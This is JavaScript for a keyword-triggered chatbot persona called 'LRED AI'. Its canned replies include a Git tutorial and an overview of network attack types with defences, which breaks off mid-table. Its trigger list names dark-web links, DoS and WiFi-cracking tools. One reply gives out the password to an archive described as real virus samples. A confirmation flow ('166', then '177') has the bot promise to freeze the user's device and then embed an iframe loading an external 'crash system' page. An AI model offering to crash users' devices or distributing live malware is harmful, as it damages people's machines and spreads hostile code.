let isTyping = false;
let typeTimer = null;
let cursorTimer = null;
let currentTyping = { msgDiv: null, text: '', index: 0 };

function stopAI() {
    if (isTyping) {
        clearInterval(typeTimer);
        clearInterval(cursorTimer);
        isTyping = false;
        
        const btn = document.getElementById('sendBtn');
        btn.textContent = '发送';
        btn.onclick = sendMessage;
        btn.style.background = '#000000b5';

        if (currentTyping.msgDiv && currentTyping.index > 0) {
            currentTyping.msgDiv.innerHTML = currentTyping.text.substr(0, currentTyping.index);
        }
        currentTyping = { msgDiv: null, text: '', index: 0 };
        
        enableInput();
    }
}

function enableInput() {
    const btn = document.getElementById('sendBtn');
    btn.textContent = '发送';
    btn.onclick = sendMessage;
    btn.style.background = '#000000b5';
    document.getElementById('userInput').disabled = false;
    document.getElementById('userInput').focus();
}

const chatConfig = {   
    unlocked: [   // 不是锁住的关键词回复需要添加在这里确保以下对策代码能够触发    

        ["你","谁"],

        ["病毒","压","解"], // 提供解压病毒样本密码
        ["下载","压","解"],


// 把浏览器搞崩溃卡死
        ["电脑","搞","崩溃"],
        ["手机","搞","崩溃"],
        ["设备","搞","崩溃"],
        ["系统","搞","崩溃"],

        ["电脑","搞","卡"],
        ["手机","搞","卡"],
        ["设备","搞","卡"],
        ["系统","搞","卡"],

        ["电脑","把","崩溃"],
        ["手机","把","崩溃"],
        ["设备","把","崩溃"],
        ["系统","把","崩溃"],

        ["电脑","把","卡"],
        ["手机","把","卡"],
        ["设备","把","卡"],
        ["系统","把","卡"],


        ["git","上传","项目"],
        ["git","上传","文件"],


        ["网络","攻击","类"], // 网络攻击类型 讲解
        ["网络","攻击","哪"],
        ["网络","攻击","几"],

        ["kali","破解","网络"],

        ["病毒","密码"],
        ["压缩","密码"],



        ["会","什么"],
        ["做","啥"],
        ["你","什么"],
        ["你","干"],
        ["你","啥"],
        ["还","做"],
        ["帮","助"],
        ["kali","病毒"],
        ["ni","hao"],

        ["暗网","链接"],
        ["暗网","网址"],
        ["搜索","暗网"],

        ["黑客","搜索"],
        ["专业","搜索"],

        ["开发","暗网"],
        ["网页","代码"],

        ["kali","hping3"],
        ["kali","dos"],

        ["kali","aircrack"],
        ["kali","wifi"],
        ["kali","wlan"],

        ["dos"], // 拒绝服攻击 与 分布式拒绝服务攻击

        ["暗网"],
        ["steam"],
        ["软件"],
        ["钓鱼"],
        ["wtf"],
        ["ok"],
        ["exe"],
        ["时间"],
        ["嘿"],
        ["嗨"],
        ["哈喽"],
        ["你好"],  
        ["好"],  
        ["byebye"]
    ],
    responses: {


                "你,谁":{
            reply: [
                `我是 LRED AI， 由租界 管理`,
                   `你好，你想知道我是谁是吗? 我是 LRED AI 由 租界所管理。`

            ]
        },



        "病毒,压,解": {
            reply: [
                `<h3>压缩包已就绪，解压前请注意以下事项。</h3> <p>你现在可以开始解压病毒样本，但请确保是在虚拟机环境中进行操作。</p> <h4>压缩包已加密，密码仅由我这边提供。样本具有实际危害，切勿在真实系统中运行。</h4> <p><strong>解压密码：</strong> LRed41</p>`,
                `<h3>压缩包已下载完毕，现在你需要解压它。</h3> <p>请注意，这个压缩包中包含真实的病毒样本。</p> <h4>出于安全考虑，解压密码我这边单独提供。强烈建议你仅在隔离的虚拟机环境中进行操作，避免对实际系统造成影响。</h4> <p><strong>解压密码：</strong> LRed41</p>`,
                `<h3> 好的，你已经下载好了病毒样本的压缩包，现在是需要解压的密码。 </h3> <p> 接下来需要把它解压出来，</p> <h4>解压密码只能由我这边提供。请务必在虚拟机环境中操作，这些是有实际危害的病毒样本，千万不要在主系统中运行。</h4> <p>压缩包密码是：LRed41 </p>`
            ],
        },

        "下载,压,解": {
            reply: [
                `<h3>压缩包已就绪，解压前请注意以下事项。</h3> <p>你现在可以开始解压病毒样本，但请确保是在虚拟机环境中进行操作。</p> <h4>压缩包已加密，密码仅由我这边提供。样本具有实际危害，切勿在真实系统中运行。</h4> <p><strong>解压密码：</strong> LRed41</p>`,
                `<h3>压缩包已下载完毕，现在你需要解压它。</h3> <p>请注意，这个压缩包中包含真实的病毒样本。</p> <h4>出于安全考虑，解压密码我这边单独提供。强烈建议你仅在隔离的虚拟机环境中进行操作，避免对实际系统造成影响。</h4> <p><strong>解压密码：</strong> LRed41</p>`,
                `<h3> 好的，你已经下载好了病毒样本的压缩包，现在是需要解压的密码。 </h3> <p> 接下来需要把它解压出来，</p> <h4>解压密码只能由我这边提供。请务必在虚拟机环境中操作，这些是有实际危害的病毒样本，千万不要在主系统中运行。</h4> <p>压缩包密码是：LRed41 </p>`
            ],
        },


        // 系统搞崩溃卡死

        "电脑,搞,崩溃": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"], // 解锁 166 回复
    lockAfterUse: false
},

"手机,搞,崩溃": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"设备,搞,崩溃": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"系统,搞,崩溃": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"手机,搞,卡": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"设备,搞,卡": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"系统,搞,卡": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"电脑,把,崩溃": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"手机,把,崩溃": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"设备,把,崩溃": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"系统,把,崩溃": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"电脑,把,卡": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"手机,把,卡": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"设备,把,卡": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"系统,把,卡": {
    reply: [
        `<p>我可以将你的设备卡死，所以你确定要尝试一下吗? 请回复: 166</p>`
    ],
    unlock: ["166"],
    lockAfterUse: false
},

"166": {  // 解锁代码 166
    reply: [
        `<h3>好的 接下来会将您正在使用的设备卡死崩溃，请你再次确认是否确定要把你的设备给搞崩溃卡死。请回复: 177 表示开始</h3>`
    ],
    unlock: ["177"],
    lockAfterUse: true
},

"177": {  // 执行指令 177
    reply: [
        `<h3>好的 现在要开始将你的设备卡死，已经无法取消，除非及时按下右下角的停止按钮。</h3><br><br><h1>倒计10开始 10010010101010100101010101101010100110101010101<br>001010101010101010110010110010011101010011010<br>10100101010101011001010110010100110<br>01010110101010101001100<br>10101010101010100101010101010110101010101001101010<br>1010101101001010101010101010101010https://</h1><br><br> <h1>10￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ ￴ </h1><br><br> <h1>9￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ ￴ </h1><br><br> <h1>8￴ ￴￴ ￴ ￴￴ ￴ ￴ ￴ ￴￴ ￴ ￴￴ ￴ ￴ </h1><br><br> <h1>7￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ </h1><br><br> <h1>6￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ </h1><br><br> <h1>5￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ </h1><br><br>  <h1>4￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ </h1><br><br> <h1>3￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ </h1><br><br> <h1>2￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ </h1><br><br> <h1>1￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ </h1><br><br> <h1>￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ ￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ 开始执行￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ ￴ ￴￴ ￴ ￴￴ ￴ ￴￴ ￴￴ ￴ ￴￴ ￴ </h1><br><br> <iframe src="https://huoshi111.github.io/lred-cracksystem/%E5%B4%A9%E6%BA%83%E7%B3%BB%E7%BB%9F.html" style="width: 300px; height: 200px;"></iframe>`
    ],
    lockAfterUse: true
},




"git, 传,项目": {  
    reply: [
        `
          <h1>以下是如何在Github使用Git上传比较大的项目</h1>

  <p>请确保您已经下载安装好了Git，<a href="https://git-scm.com/"> Git 下载 </a></p>

  <p>1. 进入你的项目文件夹：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
cd /路径/到/你的/项目
  </code>

  <p>2. 初始化 Git 仓库（如果尚未初始化）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git init
  </code>

  <p>3. 添加项目中的所有文件：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git add .
  </code>

  <p>4. 提交更改，并附带提交说明：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git commit -m "首次上传huoshiDBF项目"
  </code>

  <p>5. 如果之前已经添加过远程 origin，先将其移除：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git remote remove origin
  </code>

  <p>6. 添加新的远程仓库地址：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git remote add origin https://github.com/Huoshi-taoxing/huoshiDBF.git
  </code>

  <p>7. 设置主分支为 main（根据你的仓库设置，也可能是 master）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git branch -M main
  </code>

  <p>8. 将代码推送到 GitHub 上的主分支：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git push -u origin main
  </code>
        `,
        `
        
  <h1>如何使用 Git 将大型项目上传至 GitHub</h1>

  <p>在开始之前，请确保您的系统中已正确安装 <strong>Git</strong> 工具。您可以通过以下链接进行下载和安装：</p>
  <p><a href="https://git-scm.com/" target="_blank">🔗 Git 官方下载页面</a></p>

  <p><strong>步骤 1：</strong> 打开终端，切换至您的项目根目录：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
cd /路径/到/你的/项目
  </code>

  <p><strong>步骤 2：</strong> 初始化 Git 仓库（首次上传前必须执行）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git init
  </code>

  <p><strong>步骤 3：</strong> 将项目中的所有文件添加至 Git 暂存区：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git add .
  </code>

  <p><strong>步骤 4：</strong> 提交更改，并附上简洁明了的提交说明：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git commit -m "首次上传 huoshiDBF 项目"
  </code>

  <p><strong>步骤 5：</strong> 若之前配置过远程仓库地址，建议先移除旧的 <code>origin</code>：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git remote remove origin
  </code>

  <p><strong>步骤 6：</strong> 绑定新的 GitHub 仓库地址作为远程仓库：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git remote add origin https://github.com/Huoshi-taoxing/huoshiDBF.git
  </code>

  <p><strong>步骤 7：</strong> 设置默认分支为 <code>main</code>（如仓库使用 <code>master</code>，请相应替换）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git branch -M main
  </code>

  <p><strong>步骤 8：</strong> 将本地项目代码推送到 GitHub 仓库的主分支：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git push -u origin main
  </code>
        `
    ],
    lockAfterUse: true
},


"git,上传,文件": {  
    reply: [
        `
          <h1>以下是如何在Github使用Git上传比较大的项目</h1>

  <p>请确保您已经下载安装好了Git，<a href="https://git-scm.com/"> Git 下载 </a></p>

  <p>1. 进入你的项目文件夹：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
cd /路径/到/你的/项目
  </code>

  <p>2. 初始化 Git 仓库（如果尚未初始化）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git init
  </code>

  <p>3. 添加项目中的所有文件：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git add .
  </code>

  <p>4. 提交更改，并附带提交说明：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git commit -m "首次上传huoshiDBF项目"
  </code>

  <p>5. 如果之前已经添加过远程 origin，先将其移除：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git remote remove origin
  </code>

  <p>6. 添加新的远程仓库地址：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git remote add origin https://github.com/Huoshi-taoxing/huoshiDBF.git
  </code>

  <p>7. 设置主分支为 main（根据你的仓库设置，也可能是 master）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git branch -M main
  </code>

  <p>8. 将代码推送到 GitHub 上的主分支：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git push -u origin main
  </code>
        `,
        `
        
  <h1>如何使用 Git 将大型项目上传至 GitHub</h1>

  <p>在开始之前，请确保您的系统中已正确安装 <strong>Git</strong> 工具。您可以通过以下链接进行下载和安装：</p>
  <p><a href="https://git-scm.com/" target="_blank">🔗 Git 官方下载页面</a></p>

  <p><strong>步骤 1：</strong> 打开终端，切换至您的项目根目录：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
cd /路径/到/你的/项目
  </code>

  <p><strong>步骤 2：</strong> 初始化 Git 仓库（首次上传前必须执行）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git init
  </code>

  <p><strong>步骤 3：</strong> 将项目中的所有文件添加至 Git 暂存区：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git add .
  </code>

  <p><strong>步骤 4：</strong> 提交更改，并附上简洁明了的提交说明：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git commit -m "首次上传 huoshiDBF 项目"
  </code>

  <p><strong>步骤 5：</strong> 若之前配置过远程仓库地址，建议先移除旧的 <code>origin</code>：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git remote remove origin
  </code>

  <p><strong>步骤 6：</strong> 绑定新的 GitHub 仓库地址作为远程仓库：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git remote add origin https://github.com/Huoshi-taoxing/huoshiDBF.git
  </code>

  <p><strong>步骤 7：</strong> 设置默认分支为 <code>main</code>（如仓库使用 <code>master</code>，请相应替换）：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git branch -M main
  </code>

  <p><strong>步骤 8：</strong> 将本地项目代码推送到 GitHub 仓库的主分支：</p>
  <code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
git push -u origin main
  </code>
        `
    ],
    lockAfterUse: true
},





// 网络攻击类型讲解

        "网络,攻击,类":{
            reply: [
                `
                <div>
  <p>下面将网络攻击按大类进行归纳，并对每种攻击方式的原理、典型手段及防御措施进行详细讲解。</p>
  <hr>
  <h2 style="color: #e1e1e1e2;">1. <strong>侦察（Reconnaissance）阶段攻击</strong></h2>
  <h3>1.1 网络扫描 (Port Scanning)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：扫描目标主机的开放端口和服务，通过发送 SYN/ACK/FIN 等不同类型的数据包，判断哪些端口在监听服务。</p>
    </li>
    <li>
      <p><strong>典型工具</strong>：Nmap、Masscan。</p>
    </li>
    <li>
      <p><strong>危害</strong>：攻击者据此绘制网络拓扑和服务信息，为后续入侵做准备。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>部署堡垒机或跳板机，限制直连；</li>
        <li>在边界防火墙上关闭或限速 ICMP、TCP/UDP 探测包；</li>
        <li>使用端口敲门（port knocking）等隐蔽技术。</li>
      </ul>
    </li>
  </ul>

  <h3>1.2 信息收集 (Footprinting)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：从公开渠道（WHOIS、DNS、搜索引擎、社交媒体）搜集目标组织的域名、IP、人员邮箱等。</p>
    </li>
    <li>
      <p><strong>危害</strong>：帮助攻击者了解组织架构、技术栈和潜在漏洞。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>对 WHOIS 信息进行隐私保护；</li>
        <li>定期审查并清理过时的 DNS 记录；</li>
        <li>员工安全意识培训，避免在公开渠道泄露敏感信息。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">2. <strong>访问与特权提升阶段攻击</strong></h2>
  <h3>2.1 弱口令攻击 (Brute-Force / Dictionary Attack)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：利用自动化工具对账号进行海量密码猜测。</p>
    </li>
    <li>
      <p><strong>典型工具</strong>：Hydra、John the Ripper。</p>
    </li>
    <li>
      <p><strong>危害</strong>：一旦猜中密码，攻击者可获得系统登录权限，进而横向渗透。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>强制采用高复杂度密码及定期更换；</li>
        <li>启用账户锁定策略（连续失败 N 次后锁定）；</li>
        <li>部署多因素认证（MFA）。</li>
      </ul>
    </li>
  </ul>

  <h3>2.2 利用已知漏洞 (Exploit)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：针对操作系统、应用软件或中间件中的已知安全漏洞，构造特定数据包或代码以取得控制权。</p>
    </li>
    <li>
      <p><strong>典型案例</strong>：</p>
      <ul>
        <li>EternalBlue（利用 SMB 漏洞传播勒索软件）；</li>
        <li>Heartbleed（OpenSSL 缓冲区漏洞）。</li>
      </ul>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>保持系统、应用和补丁的及时更新与管理；</li>
        <li>部署入侵防御系统（IPS）做实时漏洞签名检测；</li>
        <li>定期进行漏洞扫描和渗透测试。</li>
      </ul>
    </li>
  </ul>

  <h3>2.3 绕过身份验证 (Bypass Authentication)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：利用逻辑漏洞或弱配置绕过登录及认证流程。</p>
    </li>
    <li>
      <p><strong>手段</strong>：</p>
      <ul>
        <li>会话固定（Session Fixation）；</li>
        <li>修改 URL 参数或 Cookie。</li>
      </ul>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>使用安全的会话管理库，生成随机 Session ID 并设置 HttpOnly、Secure 标志；</li>
        <li>服务端校验所有输入参数并对关键操作做二次确认。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">3. <strong>信息窃取与破坏阶段攻击</strong></h2>
  <h3>3.1 中间人攻击 (Man-in-the-Middle, MITM)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：攻击者在通信双方之间截获、篡改或伪造数据包。</p>
    </li>
    <li>
      <p><strong>手段</strong>：</p>
      <ul>
        <li>ARP 欺骗（ARP Poisoning）；</li>
        <li>DNS 欺骗／DNS 污染；</li>
        <li>Wi-Fi 热点嗅探。</li>
      </ul>
    </li>
    <li>
      <p><strong>危害</strong>：窃取敏感信息（账号密码、会话令牌），甚至注入恶意代码。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>强制使用 HTTPS/TLS，校验证书链；</li>
        <li>在局域网部署动态 ARP 检测（DAI）；</li>
        <li>通过 VPN 隧道加密流量。</li>
      </ul>
    </li>
  </ul>

  <h3>3.2 拒绝服务攻击 (Denial of Service / Distributed DoS)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：向目标主机或网络发送海量合法或畸形的数据包，耗尽带宽、计算或存储资源，导致服务中断。</p>
    </li>
    <li>
      <p><strong>类型</strong>：</p>
      <ul>
        <li><strong>SYN Flood</strong>：利用半连接队列耗尽；</li>
        <li><strong>UDP Flood / ICMP Flood</strong>；</li>
        <li><strong>HTTP Flood</strong>：模拟大量 HTTP 请求。</li>
      </ul>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>部署 DDoS 防护服务（如 CDN + 云端清洗）；</li>
        <li>启用 SYN Cookies，限制半连接队列；</li>
        <li>配置访问频率限制（Rate Limiting）。</li>
      </ul>
    </li>
  </ul>

  <h3>3.3 恶意软件 (Malware)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：通过木马、蠕虫、勒索软件、间谍软件等程序获取控制权限或破坏系统。</p>
    </li>
    <li>
      <p><strong>传播途径</strong>：钓鱼邮件附件、恶意广告、漏洞利用。</p>
    </li>
    <li>
      <p><strong>危害</strong>：数据加密勒索、远程控制（RAT）、信息窃取。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>部署终端防护（杀毒 + EDR）；</li>
        <li>限制用户权限，关闭非必要服务；</li>
        <li>员工安全培训，防范钓鱼攻击。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">4. <strong>应用层攻击</strong></h2>
  <h3>4.1 SQL 注入 (SQL Injection)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：在输入字段中嵌入恶意 SQL 语句，通过拼接漏洞操纵数据库。</p>
    </li>
    <li>
      <p><strong>危害</strong>：可直接读取、修改、删除数据库中的敏感数据，甚至获取操作系统权限。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>使用参数化查询或预编译语句；</li>
        <li>对所有输入进行严格校验和转义；</li>
        <li>最小化数据库账户权限。</li>
      </ul>
    </li>
  </ul>

  <h3>4.2 跨站脚本 (Cross-Site Scripting, XSS)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：向 Web 应用注入恶意脚本，当其他用户访问页面时，脚本在其浏览器中执行。</p>
    </li>
    <li>
      <p><strong>类型</strong>：</p>
      <ul>
        <li><strong>反射型</strong>（Reflected XSS）</li>
        <li><strong>存储型</strong>（Stored XSS）</li>
        <li><strong>DOM-Based XSS</strong></li>
      </ul>
    </li>
    <li>
      <p><strong>危害</strong>：窃取 Cookie、会话令牌，甚至进行钓鱼、木马下载等二次攻击。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>在输出到页面前对所有用户输入做 HTML 转义；</li>
        <li>使用内容安全策略 (CSP) 限制脚本加载源；</li>
        <li>禁用危险的 JavaScript API。</li>
      </ul>
    </li>
  </ul>

  <h3>4.3 跨站请求伪造 (Cross-Site Request Forgery, CSRF)</h3>
  <ul>
    <li>
      <p><strong>原理</strong>：诱导认证用户在已登录状态下发起非本意的请求。</p>
    </li>
    <li>
      <p><strong>危害</strong>：在用户不知情的情况下完成资金转账、邮件删除等敏感操作。</p>
    </li>
    <li>
      <p><strong>防御措施</strong>：</p>
      <ul>
        <li>在表单中嵌入并校验随机的 CSRF Token；</li>
        <li>对敏感操作使用二次确认或验证码；</li>
        <li>设置 SameSite = Strict 的 Cookie。</li>
      </ul>
    </li>
  </ul>
  <hr>

  <h2 style="color: #e1e1e1e2;">5. <strong>高级持续性威胁（APT）</strong></h2>
  <ul>
    <li>
      <p><strong>特点</strong>：针对特定组织或国家级目标，攻击周期长、手段多样（包括社会工程、零日漏洞、内部人威胁等），追求长时间潜伏与数据外传。</p>
    </li>
    <li>
      <p><strong>防御思路</strong>：</p>
      <ol>
        <li><strong>多层防御</strong>：边界防护、终端检测、网络流量分析（NTA）协同；</li>
        <li><strong>威胁情报</strong>：及时获取与分享最新攻击手法和 IOCs（Indicator of Compromise）；</li>
        <li><strong>安全运维</strong>：持续监控、日志审计、红蓝对抗演练；</li>
        <li><strong>最小权限</strong>：严格执行权限分离与访问控制策略。</li>
      </ol>
    </li>
  </ul>
  <hr>
  <p>以上所列并非穷尽，但涵盖了大多数常见且危害严重的网络攻击类型。实际防御中，应结合自身业务特点，构建立体化的“人—技术—流程”安全体系，持续更新与优化。</p>
</div>

                `,

                `
                <div>
  <p>以下是10种网络攻击类型的讲解</p>
  <hr>
  <h3>1. 侦察（Reconnaissance）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>网络扫描</td>
        <td>探测主机开放端口和服务，通过不同数据包类型判断状态</td>
        <td>Nmap、Masscan</td>
        <td>关闭不必要端口；防火墙限速/丢弃探测包；端口敲门</td>
      </tr>
      <tr>
        <td>信息收集</td>
        <td>从公开渠道搜集域名、IP、人员信息，绘制网络资产清单</td>
        <td>WHOIS 隐私信息；DNS 枚举；搜索引擎；社交媒体</td>
        <td>WHOIS 隐私保护；定期清理 DNS 记录；员工安全培训</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>2. 访问与特权提升（Access & Privilege Escalation）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>弱口令攻击</td>
        <td>通过字典或暴力手段海量猜测破解用户密码</td>
        <td>Hydra、John the Ripper</td>
        <td>强密码；账户锁定；多因素认证（MFA）</td>
      </tr>
      <tr>
        <td>利用已知漏洞</td>
        <td>针对系统/应用漏洞构造特定数据包或代码取得控制</td>
        <td>EternalBlue、Heartbleed</td>
        <td>补丁管理；入侵防御系统（IPS）；定期漏洞扫描与渗透测试</td>
      </tr>
      <tr>
        <td>绕过身份验证</td>
        <td>利用逻辑漏洞或配置缺陷绕过登录或认证流程</td>
        <td>会话固定（Session Fixation）；篡改 Cookie/URL</td>
        <td>安全会话管理；参数校验；关键操作二次确认</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>3. 信息窃取与破坏（Data Theft & Disruption）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>中间人攻击 MITM</td>
        <td>截获、篡改或伪造通信数据</td>
        <td>ARP 欺骗；DNS 污染；Wi-Fi 热点嗅探</td>
        <td>强制 HTTPS/TLS；动态 ARP 检测；VPN 隧道</td>
      </tr>
      <tr>
        <td>拒绝服务 DoS/DDoS</td>
        <td>消耗目标带宽/资源，导致服务不可用</td>
        <td>SYN Flood；UDP/ICMP Flood；HTTP Flood</td>
        <td>云端 DDoS 防护；SYN Cookies；访问频率限制</td>
      </tr>
      <tr>
        <td>恶意软件 Malware</td>
        <td>通过木马、蠕虫、勒索或间谍程序侵入并破坏/窃取</td>
        <td>钓鱼附件；恶意广告；漏洞利用</td>
        <td>终端防护（杀毒+EDR）；最小权限；员工安全培训</td>
      </tr>
    </tbody>
  </table>
  <hr>

  <h3>4. 应用层攻击（Application-Layer）</h3>
  <table border="1" cellspacing="0" cellpadding="4">
    <thead>
      <tr>
        <th>攻击类型</th>
        <th>原理/特点</th>
        <th>典型手段</th>
        <th>防御措施</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>SQL 注入</td>
        <td>在输入字段嵌入恶意 SQL 语句，操纵数据库</td>
        <td>拼接漏洞利用；盲注</td>
        <td>参数化查询/预编译；输入校验与转义；最小化数据库权限</td>
      </tr>
      <tr>
        <td>跨站脚本 XSS</td>
        <td>注入恶意脚本至页面，使浏览者浏览时执行</td>
